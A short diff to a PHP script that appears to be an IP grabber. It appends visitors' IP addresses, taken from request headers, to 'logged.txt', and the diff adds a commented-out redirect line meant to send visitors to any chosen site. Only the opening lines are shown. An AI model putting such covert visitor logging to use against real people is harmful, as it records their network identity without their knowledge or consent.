@@ -1,4 +1,5 @@
 <?php
+// header("Location: https://url.com"); // This is a option to redirect them to wtv website u want :)
 $logged = fopen("logged.txt", "a") or die("\[-] Unable to open \"logged.txt\"");
 if (!empty($_SERVER['HTTP_CLIENT_IP']))
 {
